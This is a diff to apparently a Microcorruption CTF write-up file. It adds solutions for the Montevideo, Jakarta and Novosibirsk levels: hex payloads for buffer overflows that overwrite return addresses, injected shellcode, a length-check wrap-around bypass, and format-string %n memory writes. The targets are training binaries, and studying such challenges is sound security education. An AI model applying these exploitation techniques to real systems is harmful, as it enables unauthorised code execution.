@@ -421,7 +421,7 @@ expressed by a signed byte.
 
 Thus our username will be (in hex):
 
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa017f
+```aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa017f```
 
 However, the password must also end in a null byte.  The following
 snippet appears at the end of the `login` function:
@@ -547,9 +547,7 @@ Thus the format string should be:
 
 The answer, therefore, is just:
 
-```
-8c442578256e
-```
+```8c442578256e```
 
 ## 10. Montevideo
 
@@ -572,15 +570,11 @@ to.  And since we can write to the stack, we can simulate that the
 value `7f` was pushed onto the stack just before this call.  Thus we
 will go for a buffer of the form:
 
-```
-{16 bytes of padding}{Address of call INT (e.g. 4460)}{007f}
-```
+```{16 bytes of padding}{Address of call INT (e.g. 4460)}{007f}```
 
 Thus:
 
-```
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa60447f00
-```
+```aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa60447f00```
 
 ### Alternative: 
 
@@ -593,15 +587,11 @@ b012 4c45   call INT
 
 And then use the address of the start of the input (0x43ee) as the return address:
 
-```
-{code to unlock door}{padding to length 16}{43ee}
-```
+```{code to unlock door}{padding to length 16}{43ee}```
 
 Or:
 
-```
-30127f00b0124c45aaaaaaaaaaaaaaaaee43
-```
+```30127f00b0124c45aaaaaaaaaaaaaaaaee43```
 
 The problem is that this assembled code has a null byte, so we need to modify it so that it doesn't.  For example: 
 
@@ -613,25 +603,104 @@ push r15
 call #0x454c
 ```
 
-```
-3f40017f1f838f100f12b0124c45
-```
+```3f40017f1f838f100f12b0124c45```
 
 For a final answer of:
 
-```
-3f40017f1f838f100f12b0124c45aaaaee43
-```
-
-# Writeups in progress:
+``` 3f40017f1f838f100f12b0124c45aaaaee43 ```
 
 
 ## 11. Jakarta
 
+The username and password are measured and the sum of their lengths
+ends up in r15.  Then, the following instruction is used to check that
+the total length is at most 32:
 
+``` 4600: 7f90 2100 cmp.b #0x21, r15 ```
+
+In praticular, if the total length is 0x100 = 256, this will compare 0
+with 33 and let it past.
+
+At that point, this becomes a normal buffer overflow.  So we put in username:
+
+```{32 bytes of padding}```
+
+(Only 32 bytes since the username gets checked separately to ensure it
+isn't too long.)
+
+And the password we put in a 32-byte pattern to determine which bytes
+are used for the return address, then then more bytes of padding to
+round out the total length to 256:
+
+```{32 byte pattern}{padding to round out total length to 256}```
+
+Thus: 
+
+```
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+a0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+```
+
+Breaking at the return address, we discover that sp is at the 0xa4
+byte.  So we place there the address of the `unlock_door` function:
+0x444c:
+
+```
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+a0a1a2a34c44a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+```
 
 ## 12. Novosibirsk
 
+This is another format string vulnerability, except now the code we
+want to get to execute is not present.  We can again use %n to get a
+memory overwrite.  There is the very tantalising snippet in
+`conditional_unlock_door`:
+
+```
+44c6:  3012 7e00      push	#0x7e
+44ca:  b012 3645      call	#0x4536 <INT>
+```
+
+If it were pushing `0x7f` instead, we'd be done.  So we want to use %n
+in the input to overwrite the word at 0x44c8 with 0x007f.
+
+The problem is that this requires us to output around 0x7f characters.
+For this, we'll want to use %s to output a long string in memory.
+Scanning through memory, the longest string we can find seems to be at
+the end around 0xff80.
+
+First, we have to figure out how many things we need to pop off the
+stack, so we use password:
+
+```%x%x```
+
+which outputs:
+
+```78257825```
+
+So in fact, whatever's in the format string will be consumed by the
+first %whatever in the format string.
+
+So we try:
+
+```{0xff80}{0x44c8}%s%n```
+
+This will output the four bytes 80, ff, c8, 44, followed by the string
+at 0xff80 (however long that is), and then will write the length of
+that string (plus 4) to 0x44c8.  Specifically, we try:
+
+
+```80ffc8442573256e```
+
+We observe that this places the value 0x0082 into address 0x44c8.  We
+need it to be 0x7f, so we add three to the offset of the string we're
+using:
+
+```83ffc8442573256e```
+
+
+# Writeups in progress:
 
 
 ## 13. Algiers
